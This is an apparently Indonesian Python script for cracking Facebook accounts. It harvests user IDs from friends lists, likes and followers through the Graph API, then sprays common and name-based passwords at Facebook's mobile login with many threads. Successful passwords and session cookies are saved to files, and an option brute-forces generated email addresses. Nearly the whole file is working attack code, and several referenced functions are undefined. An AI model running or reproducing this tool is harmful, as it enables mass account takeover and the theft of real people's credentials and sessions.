import requests,bs4,json,os,sys,random,datetime,time,re

import threading

from rich.table import Table as me

from rich.console import Console as sol

from bs4 import BeautifulSoup as parser

from concurrent.futures import ThreadPoolExecutor as tred

from rich.console import Group as gp

from rich.panel import Panel as nel

from rich import print as cetak

from rich.markdown import Markdown as mark

from rich.columns import Columns as col

try:ugen = open('user.txt','r').read().splitlines()

except:ugen = ['Mozilla/5.0 (Linux; U; Android 2.3.4; pt-pt; SonyEricssonLT18a Build/4.0.1.A.0.266) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.2.1; ru-ru; 9930i Build/JOP40D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 2.3.4; ru-ru; MID Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.3; en-us; ASUS_T00J Build/JSS15Q) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 4.2.2; ru-ru; Fly IQ4404 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 YandexSearch/7.16']

try:ugen2 = open('user2.txt','r').read().splitlines()

except:ugen2 = ['Mozilla/5.0 (Linux; U; Android 2.3.4; pt-pt; SonyEricssonLT18a Build/4.0.1.A.0.266) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.2.1; ru-ru; 9930i Build/JOP40D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 2.3.4; ru-ru; MID Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.3; en-us; ASUS_T00J Build/JSS15Q) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 4.2.2; ru-ru; Fly IQ4404 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 YandexSearch/7.16']



id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]



x = '\33[m' # DEFAULT

k = '\033[93m' # KUNING +

h = '\x1b[1;92m' # HIJAU +

hh = '\033[32m' # HIJAU -

u = '\033[95m' # UNGU

kk = '\033[33m' # KUNING -

b = '\33[1;96m' # BIRU -

p = '\x1b[0;34m' # BIRU +

P = '\033[0;00m'

J = '\033[0;33m'

S = '\033[0;00m'

N = '\x1b[0m'

I ='\033[0;32m'

C ='\033[0;36m'

M ='\033[0;31m'

U ='\033[0;35m'

K ='\033[0;33m'

P='\033[00m'

h='\033[0;90m'

Q="\033[00m"

kk='\033[0;32m'

ff='\033[0;36m'

G='\033[0;36m'

p='\033[00m'

h='\033[0;90m'

Q="\033[00m"

I='\033[0;32m'

II='\033[0;36m'

m='\033[0;31m'

O ='\033[0;33m'

H='\033[0;33m'

b = '\033[0;36m'

war = "[•]"

B = random.choice([U,I,K,b,M])



dic = {'1':'Januari','2':'Februari','3':'Maret','4':'April','5':'Mei','6':'Juni','7':'Juli','8':'Agustus','9':'September','10':'Oktober','11':'November','12':'Desember'}

dic2 = {'01':'Januari','02':'Februari','03':'Maret','04':'April','05':'Mei','06':'Juni','07':'Juli','08':'Agustus','09':'September','10':'Oktober','11':'November','12':'Desember'}

tgl = datetime.datetime.now().day

bln = dic[(str(datetime.datetime.now().month))]

thn = datetime.datetime.now().year

okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'

cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'

os.system('clear')

def back():
	os.system('git pull')
os.system('clear')

def banner():
	print('''%s
	_______           ______   _______  _                 ______  
       (  ____ )|\     /|(  __  \ (  ___  )( \      |\     /|(  __  \ 
       | (    )|| )   ( || (  \  )| (   ) || (      ( \   / )| (  \  )
       | (____)|| |   | || |   ) || (___) || | _____ \ (_) / | |   ) |
       |     __)| |   | || |   | ||  ___  || |(_____) ) _ (  | |   | |
       | (\ (   | |   | || |   ) || (   ) || |       / ( ) \ | |   ) |
       | ) \ \__| (___) || (__/  )| )   ( || (____/\( /   \ )| (__/  )
       |/   \__/(_______)(______/ |/     \|(_______/|/     \|(______/ 
                                                               
───────────────────────────────────────────────────────
 [\x1b[1;96m+%s] Author   : Rudal-XD
 [\x1b[1;96m+%s] Github   : https://github.com/Rudal-XD
 [\x1b[1;96m+%s] Facebook : Fanky
───────────────────────────────────────────────────────\n'''%(hh,hh,hh,hh))

#login

balmond = O+"["+J+"•"+O+"]"

def login():
	banner()
	sky = '# MASUKAN TOKEN FACEBOOK,SARAN PAKAI AKUN TUMBAL'
	sky2 = mark(sky, style='green')
	sol().print(sky2, style='cyan')
	panda = input(M+'['+hh+'•'+M+'] Token Fb EAA : %s'%(k))
	akun=open('.token.x','w').write(panda)
	try:
		tes = requests.get('https://graph.facebook.com/me?access_token='+panda)
		tes3 = json.loads(tes.text)['id']
		sue = '# nice Login berhasil'
		suu = mark(sue, style='green')
		sol().print(suu, style='cyan')
		time.sleep(2)
		menu()
	except KeyError:
		sue = '# Login Gagal, Cek token'
		suu = mark(sue, style='red')
		sol().print(suu, style='cyan')
		time.sleep(2)
		os.system('clear')
		login()
	except requests.exceptions.ConnectionError:
		li = '# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI'
		lo = mark(li, style='red')
		sol().print(lo, style='cyan')
		menu()
		

class menu:

	def __init__(self): #line1
		self.uid = []
	def menu(self):
		try:
			toke = open('token.x','r').read()
		except IOError:
			print(' [%s+%s] Kamu belum login'%(M,N));login().__login__()
		try:
			r = requests.get('https://graph.facebook.com/me?access_token=%s'%(toke)).json()['name']
		except KeyError:
			print(' [%s!%s] Login gagal ...'%(M,N));os.system('rm -rf token.x');time.sleep(2);login().__login__()
		except requests.exceptions.ConnectionError:
			exit(' [%s!%s] cek koneksi'%(M,N))
		try:
			akss = open('token.x','r').read()
		except IOError:
			akss = '-'
		banner()
		IP = requests.get('https://api.ipify.org').text
		jalan(' %s[ %sselamat Datang %s%s ]'%(N,H,r,N))
		print(' %s[%s•%s] Alamat IP kamu saat ini : %s'%(H,O,H,IP))
		print(' %s[%s•%s] Kamu masuk pada         : %s'%(N,O,N,waktu))
		print(' %s'%(N))
		print(' %s[%s0%s] crack dari daftar teman'%(N,O,N))
		print(' %s[%s1%s] crack dari akun publik'%(N,O,N))
		print(' %s[%s2%s] crack dari akun massal'%(N,O,N))
		print(' %s[%s3%s] crack dari postingan'%(N,O,N))
		print(' %s[%s4%s] crack dari likes post'%(N,O,N))
		print(' %s[%s5%s] crack dari followers'%(N,O,N))
		print(' %s[%s6%s] cek opsi akun chekpoint'%(N,O,N))
		print(' %s[%s7%s] cek hasil crack ok,cp'%(N,O,N))
		print(' %s[%s8%s] seting User-Agent'%(N,O,N))
		print(' %s[%s9%s] crack email'%(N,O,N))
		print(' %s[%sG%s] Get data² facebook'%(N,O,N))
		print(' %s[%sK%s] Lapor bug script'%(N,O,N))
		print(' %s[%sA%s] Keluar, hapus token'%(N,O,N))
		self.pilih()

	def pilih(self):

		print(' %s'%(N))

		usna = input(' %s[%s+%s] choose : '%(N,O,N))

		if usna in ['']:

			print(' %s'%(N))

			print(' %s[%s!%s] Jangan kosong mas'%(N,M,N));time.sleep(2);menu().main()

		elif usna in ['0','00']:

			try:

				token = open('token.x','r').read()

			except IOError:

				os.system('rm -rf token.x')

				exit(' %s[%s!%s] Cek token kamu'%(N,M,N))

			try:

				lmt = input(' %s[%s+%s] Limit id : '%(N,O,N))

				r = requests.get('https://graph.facebook.com/me?fields=friends.limit(%s)&access_token=%s'%(lmt,token))

				z = json.loads(r.text)

				id = []

				for w in z['friends']['data']:

					id.append(z['id'] + '<=>' + w['name'])

			except KeyError:

				print(' %s[%s!%s] Akun anda tidak publik...'%(N,M,N));time.sleep(2);menu().main()

			else:

				crack().fbeh(id)

		elif usna in ['1','01']:

			try:

				token = open('token.x','r').read()

			except IOError:

				os.system('rm -rf token.x')

				exit(' %s[%s!%s] Coba jalankan ulang !'%(N,M,N))

			try:

				print(' %s'%(N))

				idt = input(' %s[%s•%s] Masukan id : '%(N,O,N))

				r = requests.get('https://graph.facebook.com/%s?fields=friends.limit(5001)&access_token=%s'%(idt,token))

				e = json.loads(r.text)

				id = []

				for u in e['friends']['data']:

					id.append(u['id'] + '<=>' + u['name'])

			except KeyError:

				print(' %s'%(N))

				jalan(' %s[%s•%s] ID %s tidak di temukan!'%(N,M,N,idt));time.sleep(2);menu().main()

			else:

				crack().fbeh(id)

		elif usna in ['2','02']:

			token = open('token.x','r').read()

			try:

				pler = int(input(' %s[%s•%s] Mau crack berapa id : '%(N,O,N)))

			except:pler = 1

			for ikeh in range(pler):

				ikeh += 1

				try:

					print(' %s'%(N))

					idt = input(' %s[%s•%s] Masukan id yang ke %s : '%(N,O,N,ikeh))

					r = requests.get(f'https://graph.facebook.com/{idt}?fields=name,friends.fields(id,name)&access_token={token}')

					z = json.loads(r.text)

					id = []

					for a in z['friends']['data']:

						id.append(a['id'] + '<=>' + a['name'])

				except KeyError:

					pass

				else:

					pass

			crack().fbeh(id)

		elif usna in ['3','03']:

			pepek = open('token.x','r').read()

			try:

				print(' %s'%(N))

				idt = input(' %s[%s•%s] Masukan id : '%(N,O,N))

				r = requests.get('https://graph.facebook.com/%s/likes?limit=50000&access_token=%s'%(idt,pepek))

				z = json.loads(r.text)

				id = []

				for a in z['data']:

					id.append(a['id'] + '<=>' + a['name'])

			except KeyError:

				print(' %s[%s!%s] ID %s tidak publik'%(N,O,N,idt));time.sleep(3);menu().main()

			else:

				crack().fbeh(id)

		elif usna in ['4','04']:

			memek = open('token.x','r').read()

			try:

				print(' %s'%(N))

				idt = input(' %s[%s•%s] Masukan id : '%(N,O,N))

				r = requests.get('https://graph.facebook.com/%s/likes?limit=50000&access_token=%s'%(idt,memek))

				z = json.loads(r.text)

				id = []

				for e in z['data']: # MEMEK

					id.append(e['id'] + '<=>' + e['name'])

			except KeyError:

				print(' %s[%s!%s] ID %s Tidak di temukan'%(N,O,N,idt));time.sleep(2);menu().main()

			else:

				crack().fbeh(id)

		elif usna in ['5','05']:

			khamdihiXDX = open('token.x','r').read()

			try:

				print(' %s'%(N))

				idt = input(' %s[%s•%s] Masukan id : '%(N,O,N))

				r = requests.get('https://graph.facebook.com/%s/subscribers?limit=50000&access_token=%s'%(idt,khamdihiXDX))

				z = json.loads(r.text)

				id = []

				for w in z['data']:

					id.append(w['id'] + '<=>' + w['name'])

			except KeyError:

				print(' %s[%s!%s] ID %s tidak publik'%(N,O,N,idt));time.sleep(2);menu().main()

			else:

				crack().fbeh(id)

		elif usna in ['6','06']:

			print(' %s'%(N))

			print(' %s[%s•%s] Masukan -> Cp.txt sebagai file'%(N,O,N))

			files = input(' %s[%s•%s] Masukan files : '%(N,O,N))

			try:

				buka_baju = open(files, "r").readlines()

			except IOError:

				exit("\n%s [%s!%s] Files %s%s%s Tidak Ada!"%(N,M,N,H,files,N))

			for memek in buka_baju:

				kontol = memek.replace("\n","")

				titid  = kontol.split("|")

				print("\n • Account : "+(kontol.replace(" + ","")))

				try:

					khamdihi(titid[0].replace(" + ",""), titid[1])

				except requests.exceptions.ConnectionError:

					pass

			exit("\n%s [%s!%s] Done Ya Anjing"%(N,M,N))

		elif usna in ['7','07']:

			print(' %s '%(N))

			print(' %s [%s1%s] Cek hasil ok'%(N,O,N))

			print(' %s [%s2%s] Cek hasil cp'%(N,O,N))

			print(' %s [%s0%s] Kembali'%(N,O,N))

			print(' %s '%(N))

			hsl = input(' %s [%s•%s] choose : '%(N,O,N))

			if hsl in ['1','01']:

				hasil_ok = open('Ok.txt','r').read()

				if len(hasil_ok) != 0:

					print('\n')

					print('%s[ %shasil okeh %s]'%(N,H,N))

					os.system('cat Ok.txt');exit()

				else:

					print(' %s [%s!%s] Kamu gak dapet hasil okeh :('%(N,O,N))

			elif hsl in ['2','02']:

				hasil_cp = open('Cp.txt','r').read()

				if len(hasil_cp) != 0:

					print('\n')

					print(' %s[ %shasil cepeh kamu %s]'%(N,K,N))

					os.system('cat Cp.txt');exit()

			else:

				menu().main()

		elif usna in ['8','08']:

			print(' %s '%(N))

			print(' %s [%s1%s] Cek user agent default'%(N,O,N))

			print(' %s [%s2%s] Ganti user agent '%(N,O,N))

			print(' %s [%s0%s] Keluar'%(N,O,N))

			print(' %s '%(N))

			pwk = input(' %s [%s+%s] choose : '%(N,O,N))

			if pwk in ['1','01']:

				fika = open('user.txt','r').read()

				print(' %s [%s!%s] User agent sekarang : %s'%(N,O,N,fika))

				time.sleep(4);menu().main()

			elif pwk in ['2','02']:

				ua = input(' %s [%s+%s] Masukan ua baru : '%(N,O,N))

				try:

					nunu = open('user.txt','w')

					nunu.write(ua)

					nunu.close()

					print(' %s [%s!%s] Sukses mengganti ua : %s'%(N,O,N,ua));time.sleep(4);menu().main()

				except:pass

			else:

				menu().main()

		elif usna in ['9','09']:

			data = []

			print(' %s '%(N))

			nama = input(' %s [%s+%s] Target nama : '%(N,O,N))

			print(' %s [%s+%s] Contoh domain : Jika ingin crack Gmail ketik : G '%(N,O,N))

			domain = input(' %s [%s+%s] Masukan domain [G]mail, [Y]ahoo, [H]otmail : '%(N,O,N)).lower().strip()

			list = {

				'g':'@gmail.com',

				'y':'@yahoo.com',

				'h':'@hotmail.com'

			}

			jml = int(input(' %s [%s+%s] Jumlah target : '%(N,O,N)))

			pwx = input(' %s [%s+%s] Masukan password : '%(N,O,N)).split(',')

			print(' %s [%s+%s] Crack sedang di mulai'%(N,O,N))

			[data.append({'user': nama+str(e)+list[domain], 'pw':[(i) for i in pwx]}) for e in range(1,jml+1)]

			with khamdihiXD(max_workers=15) as th:

				{th.submit(brute, user['user'], user['pw']): user for user in data}

			exit('%s [%s!%s] Crack telah selezai'%(N,O,N))

		elif usna in ['G','g']:

			target()

		elif usna in ['K','k']:

			nom_wa ='+62895386194665'

			text = input(' %s [%s!%s] Apa yang error ketik di sini : '%(N,O,N))

			url_wa = ("https://api.whatsapp.com/send?phone="+nom_wa+"&text="+text)

			subprocess.check_output(["am", "start", url_wa])

			exit()

		elif usna in ['a','A']:

			os.system('rm -rf token.x');exit()

		elif usna in ['U','u']:

			nom_wa ='+62895386194665'

			kata = input(' %s [%s!%s] Masukan pesan kamu ke admin : %s'%(N,O,N,H))

			url_wa = ("https://api.whatsapp.com/+6285929340724?phone="+nom_wa+"&text="+kata)

			subprocess.check_output(["am", "start", url_wa])

			exit()

		else:

			print('%s  [%s+%s] Wrong input'%(N,M,N));time.sleep(2);menu().main()



def result():

	cek = '# CEK RESULT CRACK'

	sol().print(mark(cek, style='green'))

	kayes = '[01] Cek Hasil Cp\n[02] Cek Hasil Ok\n[00] Kembali Ke Menu'

	kis = nel(kayes, style='cyan')

	cetak(nel(kis, title='RESULTS'))

	kz = input(x+'['+p+'f'+x+'] Pilih : ')

	if kz in ['1','01']:

		try:vin = os.listdir('CP')

		except FileNotFoundError:

			gada = '# DIREKTORI TIDAK DITEMUKAN'

			sol().print(mark(gada, style='red'))

			time.sleep(2)

			back()

		if len(vin)==0:

			haha = '# ANDA BELUM MEMILIKI RESULT CP'

			sol().print(mark(haha, style='yellow'))

			time.sleep(2)

			back()

		else:

			gerr = '# HASIL CP ANDA'

			sol().print(mark(gerr, style='green'))

			cih = 0

			lol = {}

			for isi in vin:

				try:hem = open('CP/'+isi,'r').readlines()

				except:continue

				cih+=1

				if cih<10:

					nom = '0'+str(cih)

					lol.update({str(cih):str(isi)})

					lol.update({nom:str(isi)})

					print('['+nom+'] '+isi+' ---> '+str(len(hem))+' Akun'+x)

				else:

					lol.update({str(cih):str(isi)})

					print('['+str(cih)+'] '+isi+' ---> '+str(len(hem))+' Akun'+x)

			gerr2 = '# PILIH RESULT UNTUK DITAMPILKAN'

			sol().print(mark(gerr2, style='green'))

			geeh = input(x+'['+p+'f'+x+'] Pilih : ')

			try:geh = lol[geeh]

			except KeyError:

				ric = '# PILIHAN TIDAK ADA DI MENU'

				sol().print(mark(ric, style='red'))

				exit()

			try:lin = open('CP/'+geh,'r').read()

			except:

				hehe = '# FILE TIDAK DITEMUKAN, PERIKSA & COBA LAGI'

				sol().print(mark(hehe, style='red'))

				time.sleep(2)

				back()

			akun = '# LIST AKUN CP ANDA'

			sol().print(mark(akun, style='green'))

			hus = os.system('cd CP && cat '+geh)

			akun2 = '# LIST AKUN CP ANDA'

			sol().print(mark(akun, style='green'))

			input(x+'['+h+'•'+x+'] Kembali')

			back()

	elif kz in ['2','02']:

		try:vin = os.listdir('OK')

		except FileNotFoundError:

			gada = '# DIREKTORI TIDAK DITEMUKAN'

			sol().print(mark(gada, style='red'))

			time.sleep(2)

			back()

		if len(vin)==0:

			haha = '# ANDA BELUM MEMILIKI RESULT OK'

			sol().print(mark(haha, style='yellow'))

			time.sleep(2)

			back()

		else:

			gerr = '# HASIL OK ANDA'

			sol().print(mark(gerr, style='green'))

			cih = 0

			lol = {}

			for isi in vin:

				try:hem = open('OK/'+isi,'r').readlines()

				except:continue

				cih+=1

				if cih<100:

					nom = '0'+str(cih)

					lol.update({str(cih):str(isi)})

					lol.update({nom:str(isi)})

					print('['+nom+'] '+isi+' ---> '+str(len(hem))+' Akun'+x)

				else:

					lol.update({str(cih):str(isi)})

					print('['+str(cih)+'] '+isi+' ---> '+str(len(hem))+' Akun'+x)

			gerr2 = '# PILIH RESULT UNTUK DITAMPILKAN'

			sol().print(mark(gerr2, style='green'))

			geeh = input(x+'['+p+'f'+x+'] Pilih : ')

			try:geh = lol[geeh]

			except KeyError:

				ric = '# PILIHAN TIDAK ADA DI MENU'

				sol().print(mark(ric, style='red'))

				exit()

			try:lin = open('OK/'+geh,'r').read()

			except:

				hehe = '# FILE TIDAK DITEMUKAN, PERIKSA & COBA LAGI'

				sol().print(mark(hehe, style='red'))

				time.sleep(2)

				back()

			akun = '# LIST AKUN OK ANDA'

			sol().print(mark(akun, style='green'))

			hus = os.system('cd OK && cat '+geh)

			akun2 = '# LIST AKUN OK ANDA'

			sol().print(mark(akun, style='green'))

			input(x+'['+h+'•'+x+'] Kembali')

			back()

	elif kz in ['0','00']:

		back()

	else:

		ric = '# PILIHAN TIDAK ADA DI MENU'

		sol().print(mark(ric, style='red'))

		exit()



def file():

	tek = '# CEK OPSI DARI FILE'

	sol().print(mark(tek, style='cyan'), style='on red')

	print(x+'['+h+'•'+x+'] Sedang Membaca File, Tunggu Sebentar ...')

	time.sleep(2)

	teks = '# PILIH FILE YG AKAN DI CEK'

	sol().print(mark(teks, style='green'))

	my_files = []

	try:

		lis = os.listdir('CP KONTOL')

		for kt in lis:

			my_files.append(kt)

	except:pass

	try:

		mer = os.listdir('OK')

		for ty in mer:

			my_files.append(ty)

	except:pass

	if len(my_files)==0:

		yy = '# ANDA BELUM MEMILIKI RESULT UNTUK DICEK'

		sol().print(mark(yy, style='red'))

		exit()

	else:

		cih = 0

		lol = {}

		for isi in my_files:

			try:hem = open('CP/'+isi,'r').readlines()

			except:

				try:hem = open('OK/'+isi,'r').readlines()

				except:continue

			cih+=1

			if cih<10:

				nom = '0'+str(cih)

				lol.update({str(cih):str(isi)})

				lol.update({nom:str(isi)})

				print('['+nom+'] '+isi+' ---> '+str(len(hem))+' Akun'+x)

			else:

				lol.update({str(cih):str(isi)})

				print('['+str(cih)+'] '+isi+' ---> '+str(len(hem))+' Akun'+x)

		teks2 = '# PILIH FILE YG AKAN DI CEK'

		sol().print(mark(teks2, style='green'))

		geeh = input(x+'['+p+'f'+x+'] Pilih : ')

		try:geh = lol[geeh]

		except KeyError:

			ric = '# PILIHAN TIDAK ADA DI MENU'

			sol().print(mark(ric, style='red'))

			exit()

		try:

			hf = open('CP/'+geh,'r').readlines()

			for fz in hf:

				akun.append(fz.replace('\n',''))

			cek_opsi()

		except IOError:

			try:

				hf = open('OK/'+geh,'r').readlines()

				for fz in hf:

					akun.append(fz.replace('\n',''))

				cek_opsi()

			except IOError:

				hehe = '# FILE TIDAK DITEMUKAN, PERIKSA & COBA LAGI'

				sol().print(mark(hehe, style='red'))

				time.sleep(2)

				back()



def dump_publik():

	try:

		token = open('.token.txt','r').read()

	except IOError:

		exit()

	win = '# DUMP ID PUBLIK'

	win2 = mark(win, style='cyan')

	sol().print(win2)

	print(x+'['+h+'•'+x+'] Ketik "me" Jika Ingin Dump ID Dari Teman')

	pil = input(x+'['+p+'f'+x+'] Masukkan ID Facebook : ')

	try:

		koh2 = requests.get('https://graph.facebook.com/v2.0/'+pil+'?fields=friends.limit(5000)&access_token='+tokenku[0]).json()

		for pi in koh2['friends']['data']:

			try:id.append(pi['id']+'|'+pi['name'])

			except:continue

		print(x+'['+h+'•'+x+'] Total : '+str(len(id)))

		setting()

	except requests.exceptions.ConnectionError:

		li = '# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI'

		lo = mark(li, style='red')

		sol().print(lo, style='cyan')

		exit()

	except (KeyError,IOError):

		teks = '# PERTEMANAN TIDAK PUBLIK ATAU TOKEN RUSAK'

		teks2 = mark(teks, style='red')

		sol().print(teks2)

		exit()



def dump_massal():

	win = '# DUMP ID PUBLIK MASSAL'

	win2 = mark(win, style='cyan')

	sol().print(win2)

	print(x+'['+h+'•'+x+'] MASUKKAN JUMLAH ID (Jangan Lebih Dari 10)')

	try:

		jum = int(input(x+'['+p+'f'+x+'] GUA MAU NANYA!BERAPA ID AJG : '))

	except ValueError:

		pesan = '# INPUT YANG ANDA MASUKKAN BUKAN ANGKA'

		pesan2 = mark(pesan, style='red')

		sol().print(pesan2)

		exit()

	if jum<1 or jum>10:

		pesan = '# LOGIN GAGAL SILAKAN GANTI TOKEN'

		pesan2 = mark(pesan, style='red')

		sol().print(pesan2)

		exit()

	ses=requests.Session()

	yz = 0

	print(x+'['+h+'•'+x+'] Ketik "me" Jika Ingin Dump ID Dari Teman')

	for met in range(jum):

		yz+=1

		kl = input(x+'['+h+str(yz)+x+'] Masukkan ID Ke '+str(yz)+' : ')

		uid.append(kl)

	for userr in uid:

		try:

			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0]).json()

			for mi in col['friends']['data']:

				try:

					iso = (mi['id']+'|'+mi['name'])

					if iso in id:pass

					else:id.append(iso)

				except:continue

		except (KeyError,IOError):

			pass

		except requests.exceptions.ConnectionError:

			li = '# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI'

			lo = mark(li, style='red')

			sol().print(lo, style='cyan')

			exit()

	tot = '# TOTAL 👉?? %s ID, JNGN LUPA BERDOA DEK'%(len(id))

	if len(id)==0:

		tot2 = mark(tot, style='red')

	else:

		tot2 = mark(tot, style='green')

	sol().print(tot2)

	setting()



def setting():

	wl = '# SETTING URUTAN ID'

	sol().print(mark(wl, style='cyan'))

	teks = '[01] Crack Dari Akun Tertua [mayan]\n[02] Crack Dari Akun Termuda [Mantap]'

	tak = nel(teks, style='cyan')

	cetak(nel(tak, title='SETTING'))

	hu = input(x+'['+p+'f'+x+'] Pilih : ')

	if hu in ['1','01']:

		for bacot in id:

			id2.append(bacot)

	elif hu in ['2','02']:

		for bacot in id:

			id2.insert(0,bacot)

	

	else:

		ric = '# PILIHAN TIDAK ADA DI MENU'

		sol().print(mark(ric, style='red'))

		exit()

	met = '# PILIH METHOD CRACK'

	sol().print(mark(met, style='cyan'))

	ioz = '[01] Method B-Api\n[02] Method Mobile\n[03] Method Mbasic Selow Crack'

	gess = nel(ioz, style='cyan')

	cetak(nel(gess, title='METHOD'))

	hc = input(x+'['+p+'f'+x+'] Pilih : ')

	if hc in ['1','01']:

		method.append('api')

	elif hc in ['3','03']:

		method.append('Mbasic')

	else:

		method.append('mobile')

	guw = '# PILIHAN OPSI CRACK '

	sol().print(mark(guw, style='cyan'))

	aplik = input(x+'['+p+'f'+x+'] Tampilkan Aplikasi Terkait ? (y/t) : ')

	if aplik in ['y','Y']:

		taplikasi.append('ya')

	else:

		taplikasi.append('no')

	osk = input(x+'['+p+'f'+x+'] Tampilkan Opsi Checkpoint? [ Not Recommended ] (y/t) : ')

	if osk in ['y','Y']:

		oprek.append('ya')

	else:

		oprek.append('no')

	passwrd()



def passwrd():

	ler = '# CRACK DIMULAI'

	sol().print(mark(ler, style='cyan'))

	krek = 'Hasil Ok  Disimpan Ke : OK/%s\nHasil Cp Disimpan Ke : CP/%s\nHidupkan/Matikan Mode Pesawat Setiap 5 Menit'%(okc,cpc)

	cetak(nel(krek, title='CRACK'))

	with tred(max_workers=30) as pool:

		for yuzong in id2:

			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()

			frs = nmf.split(' ')[0]

			pwv = ['sayang','sayangku','sayang123','bismillah','anjing','katasandi','sandi123,malang,bismillah123,123455']

			if len(nmf)<6:

				if len(frs)<3:

					pass

				else:

					pwv.append(frs+'123')

					pwv.append(frs+'1234')

					pwv.append(frs+'12345')

			else:

				if len(frs)<3:

					pwv.append(nmf)

				else:

					pwv.append(nmf)

					pwv.append(frs+'123')

					pwv.append(frs+'1234')

					pwv.append(frs+'12345')

			if 'mobile' in method:

				pool.submit(crack,idf,pwv)

			elif 'api' in method:

				pool.submit(crack2,idf,pwv)

			elif 'free' in method:

				pool.submit(crack3,idf,pwv)

			else:

				pool.submit(crack,idf,pwv)

	print('')

	tanya = '# INGIN MENGECEK OPSI HASIL CRACK?'

	sol().print(mark(tanya, style='cyan'))

	woi = input(x+'['+p+'f'+x+'] Ingin Menampilkan Opsi Hasil Crack? (y/t) : ')

	if woi in ['y','Y']:

		cek_opsi()

	else:

		exit()



def crack(idf,pwv):

	global loop,ok,cp

	bi = random.choice([u,k,kk,b,h,hh])

	pers = loop*100/len(id2)

	fff = '%'

	print('\r%s [YANN-XD] %s/%s •_• [OK] %s •_• [CP] %s •_• %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()

	ua = random.choice(ugen)

	ua2 = random.choice(ugen2)

	ses = requests.Session()

	for pw in pwv:

		try:

			tix = time.time()

			ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})

			p = ses.get('https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F').text

			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":idf,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}

			ses.headers.update({"Host":'m.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})

			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,allow_redirects=False)

			if "checkpoint" in po.cookies.get_dict().keys():

				if 'ya' in oprek:

					akun.append(idf+'|'+pw)

					ceker(idf,pw)

				else:

					print('\n')

					statuscp = f'[•] ID       : {idf} [•] PASSWORD : {pw}'

					statuscp1 = nel(statuscp, style='red')

					cetak(nel(statuscp1, title='SESI'))

					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')

					akun.append(idf+'|'+pw)

					cp+=1

				break

			elif "c_user" in ses.cookies.get_dict().keys():

				headapp={"user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36"}

				if 'no' in taplikasi:

					ok+=1

					coki=po.cookies.get_dict()

					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])

					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')

					print('\n')

					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}'

					statusok1 = nel(statusok, style='green')

					cetak(nel(statusok1, title=' NO SESI'))

					break

				elif 'ya' in taplikasi:

					ok+=1

					coki=po.cookies.get_dict()

					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])

					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')

					user=idf

					infoakun = ""

					session = requests.Session()

